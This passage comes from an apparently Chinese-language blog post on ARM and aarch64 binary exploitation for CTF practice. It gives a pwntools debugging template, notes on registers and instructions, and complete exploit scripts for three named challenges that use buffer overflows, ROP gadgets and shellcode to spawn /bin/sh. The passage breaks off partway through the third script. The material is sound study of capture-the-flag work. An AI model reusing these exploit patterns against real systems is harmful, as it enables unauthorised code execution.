class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x1041c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x104f0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r3_pc=<span class="number">0x0001036c</span></span><br><span class="line">shellcode=asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line">ggg()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x1041c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br></pre></td></tr></table></figure><p>可以让你在运行脚本的时候自动打开一个终端并连接，然后在你指定的地方下断点并运行到断点处，这就很方便了，大家记得自己修改端口号，架构设置，程序名称，断点，如果开启了PIE的话，可以把断点设置改为<strong>b *rebase(offset)</strong></p><p>在qemu里运行arm架构的程序的话，就算开启了PIE，也是每次固定从一个偏移开始，和没开没什么区别，而且libc的地址每次也是固定的，不会有变动，当然如果是真机的话肯定是随机的，如果远程也是用qemu跑的话，可以直接使用libc而不用泄露，这给做题降低了很多难度</p><p>aarch64架构的libc就是随机的了，虽然网上也有说不随机的文章，可能版本不一样了吧，我在本地qemu运行aarch64程序调试的时候libc是随机的 ) (</p><h2 id="指令学习"><a href="#指令学习" class="headerlink" title="指令学习"></a>指令学习</h2><p>arm和aarch64都是通过寄存器传参的，没有像x86那样通过栈传参的形况</p><h3 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h3><p><code>R0~R3</code>依次用来传递函数调用参数，<code>R0</code>还用来保存函数返回结果，<code>R7</code>存放系统调用号，<code>R11（FP）</code>相当于<code>rbp</code>，</p><p><code>R13（SP）</code>相当于<code>rsp</code>，<code>R14（LR）</code>用来存放函数返回地址，<code>R15（PC）</code>相当于<code>rip</code>，<code>x64</code>函数返回的时候大多是通过<code>leave ret</code>来返回的，而arm是通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub    sp, r11, #4 将r11减4的值传给sp</span><br><span class="line">pop    &#123;r11, pc&#125; #恢复rbp，和pc</span><br></pre></td></tr></table></figure><p>来进行栈回溯的，当然我们熟悉的<code>pop</code>和<code>push</code>指令也都有</p><p>arm中没有call funk的汇编，只有B funk，BL funk，BX funk， BLX funk来进行跳转</p><p>B就相当于jmp，一般形况下BL相当于call，BL会跳转到指定位置执行代码，然后将当前位置的PC值保存到LR中，也就是将返回地址保存到了LR中</p><p>然后是ldr（加载指令）和str（存储指令）这两个指令的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr r2, [r1], #-2 将r1地址中的值传给r2，然后r1-=2</span><br><span class="line">ldr r2, [r1], r3, LSL#2  将r1地址中的值传给r2，然后r1+=r3&lt;&lt;2</span><br><span class="line">str r2, [r1, #2]  将r2中的值存储到r1中的地址加2处的地址中</span><br><span class="line">str r2, [r1, r3, LSL#2]  将r2中的值存储到r1中的地址加上r3中的值左移两位后的值所指向的地址中</span><br></pre></td></tr></table></figure><p>大概例子就这样，不懂的可以拷打AI，因为我也不是很懂，参考于<a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">这里</a></p><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><p><code>X0 ~ X7</code>用来依次传递参数，<code>X0</code>存放着函数返回值，<code>X8</code>常用来存放系统调用号或一些函数的返回结果，<code>x32</code>是PC寄存器，栈顶是<code>X31(SP)</code>寄存器，栈帧是<code>X29(FP)</code>寄存器，<code>X30(LR)</code>存放着函数的返回地址</p><p>对于B类的跳转指令，新增了BR指令，可以向寄存器里的地址跳转，这里不再叙述，详细可以参考这位大佬的文章<a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">这里</a></p><p>值得留意的是，<code>aarch64</code>中没有了<code>pop</code>和<code>push</code>指令，而是通过<code>STP</code>和<code>LDP</code>来实现的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stp    x29, x30, [sp, #-0x50]! 将x29的值push到sp-0X50处,将x30的值push到sp-0x50+0x8处,然后sp-=0x50(如果后面没有！号的话，sp不变)</span><br><span class="line">ldp    x29, x30, [sp], #0x50  将sp中的值pop到x29中，将sp+8中的值pop到x30中，然后将sp+=0x20</span><br></pre></td></tr></table></figure><p>诸如此类的使用方式</p><p><code>aarch64</code>中有ret指令，但<code>ret</code>并不是将是<code>sp</code>中的值<code>pop</code>出来当作下一条指令执行，而是<code>ret</code>到<code>LR(x30)</code>中储存的地址继续执行</p><h2 id="题目学习"><a href="#题目学习" class="headerlink" title="题目学习"></a>题目学习</h2><p>题目下载可以从<a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">这里</a>下载，这里就不讲解了，只放个exp供大家参考</p><h3 id="arm-1"><a href="#arm-1" class="headerlink" title="arm"></a>arm</h3><h4 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj typo"></a>jarvisoj typo</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = <span class="number">0x20904</span> <span class="comment"># pop &#123;r0, r4, pc&#125;; </span></span><br><span class="line">bin_sh_addr = <span class="number">0x6c384</span></span><br><span class="line">system_addr = <span class="number">0x110B4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;qemu-arm&quot;,&quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;-g&quot;,&quot;1234&quot;, &quot;pwn&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line">sla(<span class="string">b&#x27;quit&#x27;</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(gadget_addr) + p32(bin_sh_addr) + p32(<span class="number">0</span>) + p32(system_addr)</span><br><span class="line">sla(<span class="string">b&#x27;------Begin------&#x27;</span>,payload)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Codegate2018-melong"><a href="#Codegate2018-melong" class="headerlink" title="Codegate2018 melong"></a>Codegate2018 melong</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ggg</span>():</span><br><span class="line">    gdb_cmd = [</span><br><span class="line">        <span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split-window&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;set architecture arm&quot;</span>, </span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">f&quot;file pwn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>, <span class="string">&quot;target remote localhost:1234&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;b *0x1116c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-ex&quot;</span>,<span class="string">&quot;c&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    subprocess.Popen(gdb_cmd)</span><br><span class="line">    time.sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.execve(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x4007e0</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;pwn&quot;</span>])</span><br><span class="line">sla(<span class="string">b&#x27;Type the number:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>,<span class="string">b&#x27;1.70&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>,<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Type the number:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Type the number:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;How long do you want to take personal training?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Type the number:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">libc_base=<span class="number">0x40856000</span></span><br><span class="line">system,binsh=getshell()</span><br><span class="line">ro_pc=<span class="number">0x00011bbc</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54</span>+p32(ro_pc)+p32(binsh)+p32(system))</span><br><span class="line">sla(<span class="string">b&#x27;Type the number:&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4 id="Root-Me-stack-buffer-overflow-basic"><a href="#Root-Me-stack-buffer-overflow-basic" class="headerlink" title="Root Me : stack_buffer_overflow_basic"></a>Root Me : stack_buffer_overflow_basic</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>, <span class="string">&quot;gdb-multiarch&quot;</span>, <span class="string">&quot;-q&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;-&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : 